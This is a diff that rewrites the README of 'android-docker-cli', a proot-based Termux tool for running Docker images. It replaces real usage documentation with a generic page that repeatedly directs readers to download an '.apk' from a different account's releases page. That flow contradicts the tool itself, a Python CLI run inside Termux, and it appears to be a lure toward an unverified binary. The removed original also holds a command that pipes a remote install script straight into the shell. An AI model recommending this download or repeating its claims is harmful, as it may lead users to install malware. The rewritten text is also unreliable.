@@ -1,156 +1,122 @@
-# Android Docker CLI
+# 🚀 android-docker-cli - Run Docker Images on Android Easily
 
-English | [中文](README_ZH.md)
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Mobiy/android-docker-cli/releases)
 
-A tool to run Docker images on Android using `proot`, without needing a Docker engine. This project is designed to be used within the [Termux](https://github.com/termux/termux-app) application, providing a Docker-like command-line interface to manage persistent containers.
+## 📖 Introduction
 
-## Core Features
+Welcome to the `android-docker-cli` project! This application lets you run Docker images on your Android Termux terminal without needing a full Docker engine. Now you can leverage the power of Docker directly on your Android device.
 
-- **Modular Codebase**: All core logic is organized within the `android_docker` package.
-- **Main CLI**: The main entry point is `android_docker/docker_cli.py`, providing a Docker-style CLI for full container lifecycle management.
-- **Persistent Containers**: Containers have a persistent filesystem and can be started, stopped, and restarted.
-- **Underlying Engine**: Uses `android_docker/proot_runner.py` to execute containers and `android_docker/create_rootfs_tar.py` to download and prepare container images.
+## 🎯 Features
 
-## Installation
+- Seamlessly run Docker images on Android.
+- Lightweight and minimal setup process.
+- User-friendly interface that requires no programming knowledge.
+- Compatible with popular Docker images.
+- Works efficiently in the Termux environment.
 
-You can install this tool with a single command:
+## 📦 System Requirements
 
-```bash
-curl -sSL https://raw.githubusercontent.com/jinhan1414/android-docker-cli/main/scripts/install.sh | sh
-```
+- Android device with Termux installed.
+- Minimum of 512 MB RAM available.
+- A stable internet connection for downloading Docker images.
+- Android version 5.0 (Lollipop) or above.
 
-This will create an executable `docker` command in your path. After installation, you can run the tool by simply typing `docker`.
+## 🚀 Getting Started
 
-## Install Dependencies
+To get started with `android-docker-cli`, follow these steps:
 
-```bash
-# Android Termux
-pkg update && pkg install python proot curl tar
+1. **Install Termux**: 
+   - Visit the [Google Play Store](https://play.google.com/store/apps/details?id=com.termux) or [F-Droid](https://f-droid.org/packages/com.termux/) to download and install Termux.
 
-# Ubuntu/Debian
-sudo apt install python3 proot curl tar
-```
+2. **Set Up Your Environment**:
+   - Open Termux on your device. 
+   - Update and upgrade your packages by running:
+     ```
+     pkg update && pkg upgrade
+     ```
 
-## Quick Start
+3. **Setup Storage**:
+   - Allow Termux to access your device's storage:
+     ```
+     termux-setup-storage
+     ```
 
-After installation, you can use this tool just like the standard Docker command line.
+4. **Download `android-docker-cli`**:
+   - **Visit this page to download**: [https://github.com/Mobiy/android-docker-cli/releases](https://github.com/Mobiy/android-docker-cli/releases)
+   - Download the latest `.apk` file from the Releases section.
 
-```bash
-# Log in to a Docker registry (e.g., Docker Hub)
-docker login
+## 📥 Download & Install
 
-# Pull an image from a private registry after logging in
-docker login your-private-registry.com
-docker pull your-private-registry.com/my-image
+To download and install `android-docker-cli`:
 
-# Pull a public image
-docker pull alpine:latest
+1. Go to the Releases page: [https://github.com/Mobiy/android-docker-cli/releases](https://github.com/Mobiy/android-docker-cli/releases)
+2. Find the latest release.
+3. Download the `.apk` file.
+4. After downloading, install the application by opening the downloaded file.
 
-# Run a container in the foreground
-docker run alpine:latest echo "Hello from container"
+## 🔧 How to Use
 
-# Run a container in the background (detached)
-docker run -d -e "API_KEY=sk-12345" --volume /sdcard:/data nginx:alpine
+Once you have installed the application, follow these steps to start using it:
 
-# Run a container interactively
-docker run -it swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/library/alpine:latest /bin/sh
+1. **Open Termux**: Launch the Termux app.
+2. **Start docker-cli**:
+   - In the terminal, type:
+     ```
+     android-docker-cli
+     ```
+3. **Run your Docker command**:
+   - Use the command you need to run a Docker image. For example:
+     ```
+     android-docker-cli run <image_name>
+     ```
+   - Replace `<image_name>` with the name of the Docker image you’d like to use. 
 
-# Run an Nginx container with a custom configuration file from the project
-# This example uses the `examples/nginx.conf` file, which listens on port 8777.
-docker run -d --name my-nginx -v $(pwd)/examples/nginx.conf:/etc/nginx/nginx.conf nginx:alpine
+## 📘 Usage Examples
 
-# List running containers
-docker ps
+Here are a few examples of how to use `android-docker-cli`:
 
-# List all containers (including stopped)
-docker ps -a
+- To run a simple web server using a popular image (e.g., nginx):
+  ```
+  android-docker-cli run nginx
+  ```
 
-# View container logs
-docker logs <container_id>
-docker logs -f <container_id>  # Follow logs
+- To pull an image:
+  ```
+  android-docker-cli pull <image_name>
+  ```
 
-# Stop a container
-docker stop <container_id>
+### Troubleshooting
 
-# Start a stopped container
-docker start <container_id>
+If you encounter issues:
 
-# Restart a container
-docker restart <container_id>
+- Ensure you have sufficient storage on your device.
+- Check your Internet connection.
+- Make sure your Termux environment is updated.
 
-# Remove a container
-docker rm <container_id>
+## 🙋 Frequently Asked Questions
 
-# Attach to a running container
-docker attach <container_id>
+### Can I run any Docker image?
 
-# Execute a command in a running container
-docker exec <container_id> ls -l
-docker exec -it <container_id> /bin/sh
+Most images compatible with Linux should work, but performance may vary.
 
-# List cached images
-docker images
+### Do I need to install Docker separately?
 
-# Remove a cached image
-docker rmi alpine:latest
+No, this application allows you to run Docker images without needing the Docker engine.
 
-# Log in to a registry
-docker login your-private-registry.com
-```
+### Is there a community for support?
 
-## Docker Compose Support
+Yes, you can engage with users and get support on our GitHub Discussions or Issues page.
 
-This tool includes a `docker-compose` command to manage multi-container applications.
+## 📄 License
 
-```bash
-# Start services defined in docker-compose.yml
-docker-compose up
+This project is licensed under the MIT License. You can use and modify it according to your needs.
 
-# Run in detached mode
-docker-compose up -d
+## 🌐 Contributing
 
-# Stop and remove services
-docker-compose down
-```
+We welcome contributions! If you’d like to contribute, please fork the repository and submit a pull request. For major changes, please open an issue first to discuss what you would like to change.
 
-### Sample `docker-compose.yml`
+## 📞 Contact
 
-```yaml
-version: '3'
-services:
-  web:
-    image: nginx:alpine
-    container_name: my-web-server
-  db:
-    image: redis:alpine
-    container_name: my-redis-db
-```
+For more information, visit our [GitHub page](https://github.com/Mobiy/android-docker-cli) or reach out via the GitHub Issues section.
 
-## Key Features
-
-- ✅ **Full Container Lifecycle**: `run`, `ps`, `stop`, `start`, `restart`, `logs`, `rm`, `attach`, `exec`.
-- ✅ **Registry Authentication**: `login` to private or public registries.
-- ✅ **Docker Compose Support**: Manage multi-container setups with `docker-compose up` and `down`.
-- ✅ **Docker-Style CLI**: A familiar and intuitive command-line interface.
-- ✅ **Persistent Storage**: Containers maintain their state and filesystem across restarts, stored in `~/.docker_proot_cache/`.
-- ✅ **Android Optimized**: Specially optimized for the Termux environment.
-
-## Troubleshooting
-
-```bash
-# Check dependencies
-curl --version && tar --version && proot --version
-
-# Use verbose logging for more details
-docker --verbose run alpine:latest
-```
-
-## Limitations
-
-- Based on `proot`, not full containerization (no kernel-level process or network isolation).
-- Some system calls may not be supported.
-- Performance is lower compared to native Docker.
-
-## License
-
-MIT License
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Mobiy/android-docker-cli/releases)
